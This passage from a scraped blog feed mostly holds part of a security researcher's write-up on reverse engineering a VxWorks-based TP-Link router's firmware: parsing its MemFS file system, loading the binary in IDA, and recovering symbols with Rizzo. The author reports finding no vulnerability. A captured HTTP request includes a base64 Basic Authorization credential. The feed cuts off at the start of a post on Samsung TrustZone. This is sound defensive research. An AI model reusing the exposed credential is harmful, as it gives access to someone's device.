src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_window.PNG\" style=\"width: 375px;\" /> \n  <p>As I didn't have any, I accepted the default values and another warning was shown:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_warning.PNG\" style=\"width: 350px;\" /> \n  <p>Basically, our entry point is missing and IDA don't know where to start loading the file. OK, no problem. Let's try to disassemble the first bytes:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_first_try.PNG\" style=\"width: 700px;\" /> \n  <p>Great, IDA was able to identify one function and some code is shown in our disassembly window. However, it seems that it will be a hard work to reverse engineer the file with just that :P. Apparently, we have to dig deeper and find the entry point to load the file.</p> \n  <p>It's interesting to note one thing: the address <tt class=\"docutils literal\">0x802A3960</tt> is moved into the <a class=\"reference external\" href=\"https://www.doc.ic.ac.uk/lab/secondyear/spim/node10.html\">$gp</a> register. This register is a global pointer that points into the middle of a 64K block of memory in the heap that holds constants and global variables. The mentioned address gave me an idea about the memory range I could look for.</p> \n  <p>So, I returned to the firmware analysis again, trying to find something that can help me to progress a little bit more, and I found two more interesting strings:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ow1.PNG\" style=\"width: 450px;\" /> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ow2.PNG\" style=\"width: 600px;\" /> \n  <p>Both strings are \"<tt class=\"docutils literal\">OWOW..</tt>\" but with different lengths. The first occurence is 16 bytes long while the second one is 32 bytes long. My experience with file formats analysis was telling me that these strings could be a kind of <em>magic bytes</em> (bytes at some point in a file, mostly at the beginning of the file, that are used to identify the file format i.e: PE, GIF, PNG, etc). I googled a little bit and found a very good reference in the <a class=\"reference external\" href=\"http://www.devttys0.com/2011/06/mystery-file-system\">devttys0's</a> blog that helped me a lot with the analysis. In the same blog post, there is another reference to a post from <a class=\"reference external\" href=\"https://ioactive.com/solving-a-little-mystery/\">Ruben Santamarta</a> from <em>IOActive</em> with some more details about these signature bytes.</p> \n </div> \n <div class=\"section\" id=\"the-vxworks-memfs-file-system\"> \n  <h3>The VxWorks MemFS file system</h3> \n  <p>According to the previously mentioned posts, the <em>OWOW..</em> string is used as a signature in the <em>MemFS</em> Wind River management file system. The string may be found twice in the firmware, according to <em>IOactive's</em> blog spot. I'll quote the paragraph:</p> \n  <pre class=\"literal-block\">\nthe first one due to  the .h  where it is defined (close to other strings such as the webserver banner )and the second one already as part of  the MemFS.\n</pre> \n  <p>In the first place, <em>devttys0</em> <a class=\"reference external\" href=\"http://www.devttys0.com/2011/06/mystery-file-system/\">presented the following stucture</a> for the header:</p> \n  <pre class=\"literal-block\">\nstruct owfs_header\n{\n   char magic[32];           // 'OWOWOWOWOWOW...'\n   uint32_t version;         // version #1\n   uint32_t file_count;\n   uint32_t unknown;         // ??\n}\n</pre> \n  <p><em>OWFS</em> is how <em>devttys0</em> named it on the post at first when nobody knew this file system was called <em>MemFS</em>.</p> \n  <p>In my case, this definition didn't match with what I had:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/fs_second_magic.PNG\" style=\"width: 500px;\" /> \n  <p>As you can see, I had only two <em>DWORDS</em> before the file entries. I went back to the other post and found that the third field can be optional. Then, the header in my case looked more like this:</p> \n  <pre class=\"literal-block\">\nstruct owfs_header\n{\n   char magic[32];           // 'OWOWOWOWOWOW...'\n   uint32_t version;         // version #1\n   uint32_t file_count;      // 16 files\n   array filenames_plus_eof[file_count];\n}\n</pre> \n  <p>The <tt class=\"docutils literal\">flag</tt> field mentioned in the <em>IOActive's</em> blog post doesn't make sense for my firmware file. The file list after the firmware signature contains <tt class=\"docutils literal\">0x10</tt> entries. Each entry has a maximum of <tt class=\"docutils literal\">0x4C</tt> bytes in which <tt class=\"docutils literal\">0x40</tt> bytes are reserved for the filenames, 4 bytes for the file size, 4 bytes for the file offset (from the beginning of the file system header) and 4 bytes for an <em>unknown</em> field (null in all cases). The interesting thing is that all the files in the list are in plain, meaning that the <tt class=\"docutils literal\">flag</tt> field (1 in my case) doesn't represent the compressed/uncompressed option. It seems more like a version field or the values are used in the opposite way meaning 1 = plain, 2 = compressed.</p> \n  <p>In my case, the file entry header looks like this:</p> \n  <pre class=\"literal-block\">\nstruct FILE_ENTRY_HEADER\n{\n        char filename[0x40];\n        uint32_t file_size;\n        uint32_t file_offset;\n        uint32_t reserved; // always 0\n}\n</pre> \n  <p>It's almost the same definition as in the <em>devttys0's</em> post except for the last field always equal to null. It seems that the size of the header varies depending on the device/firmware.</p> \n  <p>With all this information, I was able to <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/code/extract_files.py\">write a Python script</a> to extract the files from the <em>MemFS</em> file system:</p> \n  <pre class=\"literal-block\">\nC:\\Users\\itsevart\\Documents\\reversing-tp-link-wr543g\\code&gt;python extract_files.py ..\\bin\\54B5\n[+] Extracting files from ..\\bin\\54B5\n[+] Searching signature..\n[+] Signature found at offset: 1dd1c0\n[+] SIGNATURE: OWOWOWOWOWOWOWOWOWOWOWOWOWOWOWOW\n[+] Flag: 0x00000001\n[+] File count: 16\n[+] Reading file entries..\n&gt;&gt; Entry no 0\n[+] filename: /rc_filesys/doc/dynaform/common.js\n[+] file size: 915 bytes\n[+] file offset: 0x000004e8\n&gt;&gt; Entry no 1\n[+] filename: /rc_filesys/doc/dynaform/css_help.css\n[+] file size: 627 bytes\n[+] file offset: 0x0000087c\n&gt;&gt; Entry no 2\n[+] filename: /rc_filesys/doc/dynaform/css_main.css\n[+] file size: 2063 bytes\n[+] file offset: 0x00000af0\n&gt;&gt; Entry no 3\n[+] filename: /rc_filesys/doc/frames/top.htm\n[+] file size: 1763 bytes\n[+] file offset: 0x00001300\n&gt;&gt; Entry no 4\n[+] filename: /rc_filesys/doc/images/blue.gif\n[+] file size: 62 bytes\n[+] file offset: 0x000019e4\n&gt;&gt; Entry no 5\n[+] filename: /rc_filesys/doc/dynaform/commonfuncsEn1.js\n[+] file size: 3675 bytes\n[+] file offset: 0x00001a24\n&gt;&gt; Entry no 6\n[+] filename: /rc_filesys/doc/dynaform/commonfuncsEn3.js\n[+] file size: 3648 bytes\n[+] file offset: 0x00002880\n&gt;&gt; Entry no 7\n[+] filename: /rc_filesys/doc/images/helpPic.gif\n[+] file size: 5515 bytes\n[+] file offset: 0x000036c0\n&gt;&gt; Entry no 8\n[+] filename: /rc_filesys/doc/images/minus.gif\n[+] file size: 59 bytes\n[+] file offset: 0x00004c4c\n&gt;&gt; Entry no 9\n[+] filename: /rc_filesys/doc/images/plus.gif\n[+] file size: 63 bytes\n[+] file offset: 0x00004c88\n&gt;&gt; Entry no 10\n[+] filename: /rc_filesys/doc/images/productphoto.gif\n[+] file size: 4634 bytes\n[+] file offset: 0x00004cc8\n&gt;&gt; Entry no 11\n[+] filename: /rc_filesys/doc/images/pw.gif\n[+] file size: 60 bytes\n[+] file offset: 0x00005ee4\n&gt;&gt; Entry no 12\n[+] filename: /rc_filesys/doc/images/top1_1.jpg\n[+] file size: 4076 bytes\n[+] file offset: 0x00005f20\n&gt;&gt; Entry no 13\n[+] filename: /rc_filesys/doc/images/top1_2.jpg\n[+] file size: 9790 bytes\n[+] file offset: 0x00006f0c\n&gt;&gt; Entry no 14\n[+] filename: /rc_filesys/doc/images/top2.jpg\n[+] file size: 1221 bytes\n[+] file offset: 0x0000954c\n&gt;&gt; Entry no 15\n[+] filename: /rc_filesys/doc/images/top_bg.jpg\n[+] file size: 289 bytes\n[+] file offset: 0x00009a14\n</pre> \n  <p>Even though I was able to extract several files, 16 in total, I thought there were very few. In fact, remember that I showed a lot more references to <em>.htm</em> files. I started to search a little bit more and noted that there were lots of files scattered in the firmware data that didn't follow any structure and didn't contain any specific header so far. Some of these files contained a footer but no header. I started to look around the first signature occurrence and noted that there was a kind of table:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/fs_first_magic.PNG\" style=\"width: 500px;\" /> \n  <p>Unfortunately, I wasn't able to find a relation bewteen this table and the scattered files content.</p> \n  <p>Just a color note, I found that <a class=\"reference external\" href=\"https://bitsum.com/firmware_mod_kit.htm\">Firmware Mod Kit</a> is using the same <a class=\"reference external\" href=\"https://github.com/rampageX/firmware-mod-kit/blob/5e74fe9dd95d546c7de3a0b1f85a0bcbb99f7a3e/src/binwalk-2.1.1/src/binwalk/magic/filesystems#L537\">header</a> struct for MemFS file systems mentioned on the <a class=\"reference external\" href=\"https://ioactive.com/solving-a-little-mystery/\">IOActive's post</a> and <a class=\"reference external\" href=\"http://www.devttys0.com/2011/06/mystery-file-system/\">devttys0's post</a>, however, that's not entirely my case.</p> \n </div> \n <div class=\"section\" id=\"getting-the-binary-being-loaded-by-ida\"> \n  <h3>Getting the binary being loaded by IDA</h3> \n  <p>Once I extracted the files, I needed a way to continue with the analysis because the files I obtained weren't too interesting and I was sure that there were more inside. As I already mentioned, they weren't, probably, files with all their entire structure but parts of them handled by some respective service (HTTP, FTP, etc;), a kind of standalone server handling different types of protocols and sending chunks of files.</p> \n  <p>I needed a way to load the extracted data in IDA and get the all the functions, strings, symbols, etc; in order to do a more extensive analysis. The main goal I needed to accomplish was to find the base address to load the binary.</p> \n  <p>Again, I found two <a class=\"reference external\" href=\"http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/\">interesting</a> and <a class=\"reference external\" href=\"https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/\">helpful</a> blog posts.</p> \n  <p>In the post from the <em>devttys0's</em> blog, the author obtains the base address by analyzing an extracted MIPS binary with symbols extracted from the firmware in IDA. That binary is responsible for loading and decompressing a <em>LZMA</em> stream located at certain part of the firmware. The base address to load the decompressed stream is clearly referenced in the code. It's also mentioned that this address is used at some code found on the Internet:</p> \n  <pre class=\"literal-block\">\nSo it appears that the LZMA data that we extracted earlier does contain executable code, and that it is decompressed and loaded into memory at address 0x80001000. A Google search for 'vxworks lzmadecode' turns up some source code that confirms this conclusion.\n</pre> \n  <p>The referenced <a class=\"reference external\" href=\"http://www.hackchina.com/en/cont/27807\">link</a> doesn't work for me. I did a quick search again and found only one reference to a <a class=\"reference external\" href=\"https://frickel.cloud/firmware/openwrt/commit/4c4d3630369781f7dfb9bd8915ea9ffdb8c6d24e?expanded=1\">LZMA decoder</a> using that address.</p> \n  <p>In the post from <em>cq674350529's</em> blog, the base address to load the binary is obtained from the output provided by <em>Binwalk</em>. A <em>U-Boot</em> header is found in the firmware file and contains a reference to an entry point address, that entry point address is the one used as base address in IDA.</p> \n  <p>In my case, both approaches didn't fit with my situation. I didn't have any <em>U-Boot</em> header or anything similar to that and I didn't have any other binary to analyze. My guess is that, in my case, the base address doesn't need to be inside the firmware data becase, probably, it's hardcoded in the bootloader. All the code needed to unpack the data is located on the device. What now? well, there is a coincidence in both post, the base address: <em>0x80001000</em>. Let's try with that:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_second_try.PNG\" style=\"width: 375px;\" /> \n  <p>This was the result:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_second_try_2.PNG\" style=\"width: 650px;\" /> \n  <p>Bingo! After hitting <em>C</em> to create code in the disassembly window, IDA started to work with the auto-analysis and found a lot of functions. Several more than the one found when no base address was specified :P</p> \n  <p>Now, it can be seen that some of the strings that are part of <em>chuncked</em> files, are referenced in the code:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/files_xrefs.PNG\" style=\"width: 700px;\" /> \n  <p>OK, I was able to reverse engineer the binary but, even though I had some string xrefs, there weren't any symbol. In the case of the <em>cq674350529's</em> blog post, the symbols were scattered in the firmware file and author needed to write a script in order to build the symbol table because IDA wasn't able to do it with the auto-analysis. However, in my case, I didn't have any known VxWorks symbol.</p> \n  <p>Anyway, by using the string xrefs and numeric constants it's possible to reverse engineer and rename functions. For example, I found the following string xref <em>Error: MD4Update MD already done.</em>. That string belongs to the <a class=\"reference external\" href=\"https://github.com/Noisyfox/ty_pppd_legacy/blob/master/pppd/md4.c\">Implementation of MD4 Message Digest Algorithm</a>. It's possible to find some of the functions referenced in the source code by searching for the initialization constants:</p> \n  <pre class=\"literal-block\">\n#define I0  0x67452301       /* Initial values for MD buffer */\n#define I1  0xefcdab89\n#define I2  0x98badcfe\n#define I3  0x10325476\n#define C2  013240474631     /* round 2 constant = sqrt(2) in octal */\n#define C3  015666365641     /* round 3 constant = sqrt(3) in octal */\n</pre> \n  <p>This is the corresponding code in the <em>MIPS</em> binary:</p> \n  <pre class=\"literal-block\">\nlui     $a1, 0xEFCD\nlui     $a2, 0x98BA\nlui     $v0, 0x1032\nori     $v1, 0x2301\nli      $a1, 0xEFCDAB89 --&gt; this constant\nli      $a2, 0x98BADCFE --&gt; this one too\nli      $v0, 0x10325476\nsw      $v0, 0xC($a0)\nsw      $v1, 0($a0)\nsw      $a1, 4($a0)\nsw      $a2, 8($a0)\nsw      $zero, 0x10($a0)\njr      $ra\nsw      $zero, 0x14($a0)\n</pre> \n  <p>That's the <em>MD4Init()</em> function.</p> \n  <p>Event though this is a good and common approach when reversing a binary without symbols, it takes a considerable time to have a decent list of reversed functions. Also, there are some common functions such as printf, memset, memcpy, etc... that can be easily identified but sometimes it depends on the compiler optimizations and flags used during the compilation process. So, I was sure there was an easier way to automate the work of identifying common functions and I was right :)</p> \n  <div class=\"section\" id=\"getting-symbols\"> \n   <h4>Getting symbols</h4> \n   <p>In order to automate the task of identify common functions I used <a class=\"reference external\" href=\"https://github.com/devttys0/ida/tree/master/plugins/rizzo\">Rizzo</a>, an IDA plugin developed by <em>devttys0</em> that includes <em>fuzzy</em> signatures made with unique string references and other metrics as identifiable actions, such as memory accesses, references to constant values, and function calls. However, the plugin is a little bit outdated, the last change was 2 years ago in order to support <em>IDA</em> 7 and only supports <em>Python</em> 2. <a class=\"reference external\" href=\"https://github.com/devttys0/ida/issues/32\">I reported</a> an issue and <em>@fuzzywalls</em> (thanks btw) sent me <a class=\"reference external\" href=\"https://github.com/fuzzywalls/ida\">his fork</a>. However, that fork didn't work with the build of <em>IDA</em> 7.4 I had (191112).</p> \n   <p>After some work, I was finally able to fix all the issues and make it work with my <em>IDA</em> build and <em>Python</em> 2. These are the results:</p> \n   <pre class=\"literal-block\">\nFound 3 formal matches in 0.00 seconds.\nFound 107 fuzzy matches in 0.00 seconds.\nFound 188 string matches in 0.00 seconds.\nFound 40 immediate matches in 0.00 seconds.\nRenamed 162 functions in 0.54 seconds.\nSignatures applied in 24.04 seconds\nCaching 'Functions window'... ok\nCaching 'Names window'... ok\n</pre> \n   <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/rizzo_functions.PNG\" style=\"width: 700px;\" /> \n   <p>You can find my version of Rizzo <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/code/rizzo.zip\">here</a>.</p> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"last-words\"> \n <h2>Last words</h2> \n <p>Once I got some symbols with <em>Rizzo</em>, I conducted a session to search for vulnerabilities but it wasn't successful :(</p> \n <p>I started looking at the functions that <em>Rizzo</em> was able to recognize.</p> \n <p>Some of the functions are related to <em>DES</em> and <em>MD4</em> and weren't too interesting for me, these functions belong to some public implementation, for example: <a class=\"reference external\" href=\"https://github.com/Noisyfox/ty_pppd_legacy/blob/master/pppd/md4.c\">Implementation of MD4 Message Digest Algorithm</a>. However, there are strings referencing functions that are, I guess, related to the configuration file (the configuration file can be dumped from the router's <em>GUI</em>, it's encrypted/obfuscated in some way):</p> \n <pre class=\"literal-block\">\nROM:801FA99C aApcfgencryptio:.ascii \"apCfgEncryptionSet(%d, TRUE) failed\\r\\n\"&lt;0&gt;\nROM:801FA9C2                 .byte    0\nROM:801FA9C3                 .byte    0\nROM:801FA9C4 aIwirelessprivs:.ascii \"iWirelessPrivSelect = %d, secSubType[1] = %d\\r\\n\"&lt;0&gt;\nROM:801FA9F3                 .byte    0\nROM:801FA9F4 aApcfgauthtypes:.ascii \"apCfgAuthTypeSet() failed\\r\\n\"&lt;0&gt;\nROM:801FAA10 aApcfgcipherset:.ascii \"apCfgCipherSet() failed\\r\\n\"&lt;0&gt;\nROM:801FAA2A                 .byte    0\nROM:801FAA2B                 .byte    0\nROM:801FAA2C aApcfgkeysrcset:.ascii \"apCfgKeySrcSet() failed\\r\\n\"&lt;0&gt;\nROM:801FAA46                 .byte    0\nROM:801FAA47                 .byte    0\nROM:801FAA48 aApcfggroupkeyu:.ascii \"apCfgGroupKeyUpdateIntervalSet() failed\\r\\n\"&lt;0&gt;\nROM:801FAA72                 .byte    0\nROM:801FAA73                 .byte    0\nROM:801FAA74 aErrorUnableToG:.ascii \"ERROR: Unable to generate key with given passphrase and ssid\\n\"\nROM:801FAA74                 .ascii &lt;0&gt;\nROM:801FAAB2                 .byte    0\nROM:801FAAB3                 .byte    0\nROM:801FAAB4 aApcfgpassphras:.ascii \"apCfgPassphraseSet() failed\\r\\n\"&lt;0&gt;\nROM:801FAAD2                 .byte    0\nROM:801FAAD3                 .byte    0\nROM:801FAAD4 aApcfgpassphras_0:.ascii \"apCfgPassphraseKeySet() failed\\r\\n\"&lt;0&gt;\n</pre> \n <p>Unfortunately, there aren't xrefs to these strings.</p> \n <p>Some others like the following, took me to this <a class=\"reference external\" href=\"http://read.pudn.com/downloads90/sourcecode/os/343695/vxworks_stp_src/vxbufs.c__.htm\">source code</a> (apparently, related to Ethernet and a kind of descriptors conversion between Atheros and <em>VxWorks</em>):</p> \n <pre class=\"literal-block\">\nROM:801FA5B8 aVxdesctomblkEr:.ascii \"\\n\"\nROM:801FA5B8                 .ascii \"vxDescToMblk: error in join mBlk\\n\"&lt;0&gt;\nROM:801FA5DB                 .byte    0\nROM:801FA5DC aVxmblktodescMP:.ascii \"vxMblkToDesc: M_PKTHDR not set on first mblk\\n\"&lt;0&gt;\n</pre> \n <p>Again, these strings don't have xrefs :(</p> \n <p>The rest of the functions don't look so promising (as can be seen in <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/logs/ida_functions.txt\">this file</a>), most of them are standard functions or auxiliary. There isn't any interesting function like a custom handler or something similar.</p> \n <p>Another thing I tried was using the <a class=\"reference external\" href=\"https://portswigger.net/burp\">Burp Suite</a> in order to intercept some of the requests from the <em>HTTP</em> server (the only service exposed by the device) and try to trigger a crash in some way, for example, modifying the parameters of the request. The following example is a capture from the <em>NTP</em> server configuration:</p> \n <pre class=\"literal-block\">\nGET /userRpm/DateTimeCfgRpm.htm?timezone=540&amp;month=1&amp;day=1&amp;year=2006&amp;hour=11&amp;minute=59&amp;second=52&amp;ntpA=0.0.0.0&amp;ntpB=0.0.0.0&amp;Submit=Save HTTP/1.1\n\nHost: 192.168.1.1\n\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\nAccept-Language: en-GB,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nReferer: http://192.168.1.1/userRpm/DateTimeCfgRpm.htm\n\nAuthorization: Basic bnJpdmE6SncyWGtEYWpWbG1jaA==\n\nConnection: close\n\nUpgrade-Insecure-Requests: 1\n</pre> \n <p>In order to get some output, I connected a serial device interface on the other side in order to catch for possible outputs, however, <em>Windows</em> 10 was giving me some troubles with the <em>USB</em> interface. I got some errors related to max voltage consumption and had to restart the PC several times in order to continue.</p> \n <p>At the end, by doing some test and looking at the code in the binary, it seems that everything is handeld there (in a single binary) and most answers are harcoded. The server responds with hardcoded \"chunks\" of data and any other request that doesn't fit with the answer, is dropped. Different requests (with different parameters) return the same answer, for example, when changing the <em>NTP</em> server.</p> \n</div> \n<div class=\"section\" id=\"what-else-can-be-done\"> \n <h2>What else can be done?</h2> \n <p>Well, probably a debugger inside the device would have been very helpful. A possibility to accomplish this task would have been to modify the firmware and upload a custom <em>GDB</em> server. However, it would have required to compile <em>GDB</em> server for <em>MIPS</em> using the <a class=\"reference external\" href=\"https://labs.windriver.com/vxworks-sdk/\">compilation tools for VxWorks</a> (apparently, it's only targeting x86/x64/ARM and <em>VxWorks 7</em>). If someone feels like trying, please, I'd be really glad to hear from them!.</p> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>Certainly, to reverse engineer an unknown architecture or deal with an uncommon OS has its complications but sometimes, even with few information available, it's possible to make some progress and finish the work. In this particular case, it was possible thanks to some guys who found similar issues in the past and documented the process.</p> \n <p>Thanks to that, I was able to reverse engineer the unknown file system used in the router and to get familiar with the operating system. It would have been nice to find a vulnerability but I wasn't lucky at this time. Begin able to gain access to a shell or to upload tools to the router in order to debug it, would really be a big step towards assessing its security and hunting for its vulnerabilities, and will require some more work!</p> \n <p>Anyway, I hope that sharing this experience will in turn prove useful to others.</p> \n</div> \n<div class=\"section\" id=\"acknowledgements\"> \n <h2>Acknowledgements</h2> \n <ul class=\"simple\"> \n  <li>Thanks to all my Quarkslab colleagues who proofread this article and provided valuable feedback.</li> \n  <li>Thanks to <a class=\"reference external\" href=\"http://www.devttys0.com/\">Craig Heffner (devttys0)</a> for his amazing posts, tools and continuous work on embedded devices.</li> \n  <li>Thanks to <a class=\"reference external\" href=\"https://github.com/fuzzywalls\">Evan Walls (fuzzywalls)</a> for helping me with his <em>Rizzo</em> fork. I just fixed what was needed to make it work instead of porting the entire plugin to the new <em>IDA</em> 7.4 <em>API</em>.</li> \n </ul> \n</div> \n<div class=\"section\" id=\"vxworks-related-work\"> \n <h2>VxWorks related work</h2> \n <p>If you want to read more detailed information about VxWorks, you can start with the following publications:</p> \n <ul class=\"simple\"> \n  <li><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/VxWorks\">VxWorks Wikipedia entry</a></li> \n  <li><a class=\"reference external\" href=\"http://www.secniche.org/vxworks/\">Digging Inside VxWorks (OS + Firmware) - The Holistic Security</a></li> \n  <li><a class=\"reference external\" href=\"https://www.slideshare.net/44Con/44con-london-attacking-vxworks-from-stone-age-to-interstellar\">44CON London - Attacking VxWorks: from Stone Age to Interstellar</a></li> \n  <li><a class=\"reference external\" href=\"https://blog.rapid7.com/2010/08/02/shiny-old-vxworks-vulnerabilities/\">Shiny Old VxWorks Vulnerabilities</a></li> \n  <li><a class=\"reference external\" href=\"https://speakerdeck.com/hdm/fun-with-vxworks?slide=40\">Fun with VxWorks</a></li> \n  <li><a class=\"reference external\" href=\"https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Zhu-Dive-into-VxWorks-Based-IoT-Device-Debug-the-Undebugable-Device.pdf\">Dive into VxWorks Based IoT Device Debug the Undebugable Device</a></li> \n  <li><a class=\"reference external\" href=\"https://www.cnblogs.com/hac425/p/9706815.html\">https://www.cnblogs.com/hac425/p/9706815.html</a></li> \n </ul> \n <p>Tools:</p> \n <ul class=\"simple\"> \n  <li><a class=\"reference external\" href=\"https://github.com/LeeXiaolan/tplink-vxworks-based-firmware\">Tools for working with TP-LINK VxWorks-based router firmware</a></li> \n </ul> \n</div>","descriptionType":"html","publishedDate":"Wed, 06 May 2020 22:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/front.jpg","linkMd5":"24f6ad74a1a22bf2ec938c3de16a5402","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn45@2020_2/2020/08/25/01-15-10-793_4a85fb96fb5d9b60.webp","destWidth":4032,"destHeight":3024,"sourceBytes":4543880,"destBytes":1068702,"author":"Nahuel Riva","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/front.jpg":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn45@2020_2/2020/08/25/01-15-10-793_4a85fb96fb5d9b60.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/back.jpg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn96@2020_1/2020/08/25/01-15-14-011_7f7e51da9810b8c1.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/chips.jpg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn8@2020_3/2020/08/25/01-15-13-369_aa5c707792c4e840.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/uart.jpg":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn47@2020_3/2020/08/25/01-15-13-300_c5bbef72b0ad02c9.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/putty-config.PNG":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn61@2020_5/2020/08/25/01-15-16-073_85f4cd0751afeede.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/strings1.PNG":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn28@2020_2/2020/08/25/01-15-12-486_eebc418b1eb7ce9b.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_window.PNG":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn46@2020_2/2020/08/25/01-15-15-076_2e0a53c700e8bfdf.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_warning.PNG":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn12@2020_3/2020/08/25/01-15-12-978_7ab1fbc971c8740e.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_first_try.PNG":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn68@2020_5/2020/08/25/01-15-13-090_5677346e646ff0b3.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ow1.PNG":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn44@2020_3/2020/08/25/01-15-14-449_6b5642a7e45d87b6.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ow2.PNG":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn63@2020_4/2020/08/25/01-15-14-273_1dd9bedc1c65d95b.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/fs_second_magic.PNG":"https://cdn.jsdelivr.net/gh/myreaderx/cdn82@2020_3/2020/08/25/01-15-16-337_05240c71cb2757dc.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/fs_first_magic.PNG":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn59@2020_2/2020/08/25/01-15-14-266_37812c90ad5d71e5.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_second_try.PNG":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn15@2020_1/2020/08/25/01-15-15-048_d5b77921dc7cfb92.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_second_try_2.PNG":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn24@2020_6/2020/08/25/01-15-12-970_8e11cbfd2d09a41e.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/files_xrefs.PNG":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn91@2020_1/2020/08/25/01-15-14-418_a6ac20877bff3794.webp","http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/rizzo_functions.PNG":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn79@2020_4/2020/08/25/01-15-13-450_435a459dcac67446.webp"},"publishedOrCreatedDate":1598318092717},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"A Deep Dive Into Samsung's TrustZone (Part 1)","link":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","description":"<style> img { border: none; border-radius: 0px; padding: 4px; margin: 1em 1em 1em 0; box-shadow: none; max-width: 100%; max-height: 450px; width:auto; height: auto; } .align-center { margin-top: 20px; margin-bottom: 20px; } </style> \n<div class=\"section\" id=\"motivations\"> \n <h2>Motivations</h2> \n <p>After a <a class=\"reference external\" href=\"https://blog.quarkslab.com/introduction-to-trusted-execution-environment-arms-trustzone.html\">general introduction on the ARM TrustZone</a> and a focus on <a class=\"reference external\" href=\"https://blog.quarkslab.com/attacking-the-arms-trustzone.html\">Qualcomm's implementation</a>, this new series of articles will discuss and detail the implementation developed by Samsung and Trustonic.</p> \n <p>These blog posts are a follow up to the conference <a class=\"reference 